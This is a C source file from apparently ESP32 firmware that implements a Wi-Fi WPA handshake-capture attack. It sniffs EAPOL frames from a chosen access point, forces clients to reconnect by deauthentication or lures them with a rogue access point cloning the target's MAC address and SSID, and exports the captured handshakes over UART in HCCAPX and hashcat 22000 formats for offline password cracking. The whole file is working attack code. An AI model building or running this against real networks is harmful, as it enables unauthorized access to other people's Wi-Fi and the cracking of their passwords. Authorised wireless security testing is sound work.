#include "attack_handshake.h"
#include "hccapx_serializer.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "frame_analyzer_parser.h"
#include "attack_deauth.h"
#include "packet_monitor.h"
#include "uart_controller.h"
#include "data_converter.h"
#include <string.h>

static handshake_method_t previous_method = METHOD_PASSIVE;
static bool handshake_is_run = false;
static bool send_pcap;

void handshake_method_evil_ap(const wifi_ap_record_t *ap_record);

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    if (send_pcap) add_pcap_packet(frame);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);
}

void handshake_attack_start(wifi_ap_record_t * target, handshake_method_t method, bool send_pcap_flag) {
    if (handshake_is_run)
        handshake_attack_stop();

    send_pcap = send_pcap_flag;
    previous_method = method;

    hccapx_serializer_init(target->ssid, strlen((char *)target->ssid));
    wifi_sniffer_filter_frame_types(true, false, false);
    if (send_pcap) {
        add_pcap_header();
        start_pcap_sender();
    }
    wifi_sniffer_start(target->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, target->bssid);
	ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    if (previous_method == METHOD_DEAUTH)
        deauth_attack_start(target, 500);
    else if (previous_method == METHOD_EVIL_AP)
        handshake_method_evil_ap(target);
    handshake_is_run = true;
}

void handshake_attack_stop() {
    if (!handshake_is_run)
        return;
    if (previous_method == METHOD_DEAUTH)
        deauth_attack_stop();
    else if (previous_method == METHOD_EVIL_AP)
        wifi_default_ap_start();
    if (send_pcap)
        stop_pcap_sender();
    wifi_sniffer_stop();
    frame_analyzer_capture_stop();
	ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler));
    handshake_is_run = false;
}

void handshake_method_evil_ap(const wifi_ap_record_t *ap_record) {
    wifi_set_ap_mac((uint8_t *)ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifi_ap_start(&ap_config);
}

void handshake_get_hccapx_data() {
    uint16_t hccapx_size = sizeof(hccapx_t);
    uint16_t packet_header_size = strlen("HCCAPX data: ");
    char hccapx_data[packet_header_size + hccapx_size + 2]; //hccapx_size + packet_header_size + '\n' + '\0'
    hccapx_t * hccapx = hccapx_serializer_get();
    memcpy(hccapx_data, "HCCAPX data: ", packet_header_size);
    if (hccapx == NULL) {
        hccapx_size = strlen("NONE");
        memcpy(hccapx_data + packet_header_size, "NONE", hccapx_size);
    } else {
        memcpy(hccapx_data + packet_header_size, hccapx, hccapx_size);
    }
    memcpy(hccapx_data + packet_header_size + hccapx_size, "\n", 2);
    UART_write(hccapx_data, packet_header_size + hccapx_size + 1);
}

void handshake_get_hc22000_data() {
    uint16_t packet_header_size = strlen("HC22000 data: ");
    char hc22000_data[packet_header_size + MAX_HC22000_02_LEN + 2]; //packet_header_size + MAX_HC22000_02_LEN + '\n' + '\0'
    memcpy(hc22000_data, "HC22000 data: ", packet_header_size);
    hccapx_t * hccapx = hccapx_serializer_get();
    uint16_t hc22000_size = 0;
    if (hccapx == NULL) {
        hc22000_size = strlen("NONE");
        memcpy(hc22000_data + packet_header_size, "NONE", hc22000_size);
    } else {
        hc22000_size = (uint16_t)hccapx_to_hc22000(hc22000_data + packet_header_size, hccapx);
    }
    memcpy(hc22000_data + packet_header_size + hc22000_size, "\n", 2);
    UART_write(hc22000_data, packet_header_size + hc22000_size + 1);
}